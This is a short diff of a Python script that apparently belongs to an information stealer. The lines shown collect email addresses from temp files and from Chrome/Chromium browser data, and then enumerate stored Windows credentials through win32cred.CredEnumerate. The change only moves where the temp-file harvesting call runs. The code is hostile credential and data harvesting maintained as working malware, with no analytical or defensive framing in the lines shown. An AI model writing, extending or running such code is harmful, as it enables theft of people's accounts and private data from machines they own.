@@ -813,6 +813,7 @@ def find_emails_in_temp():
     return emails
 
 emails = []
+emails.extend(find_emails_in_temp())
 
 if os.path.exists(chrome_path): 
     chrome_emails = chromiumOnly(chrome_path, email_pattern, CHROME_BROWSER)
@@ -962,7 +963,6 @@ def fetch_out(email_pattern):
     return emails
 
 emails.extend(fetch_out(email_pattern))
-emails.extend(find_emails_in_temp())
 
 try:
     creds = win32cred.CredEnumerate(None, 0)
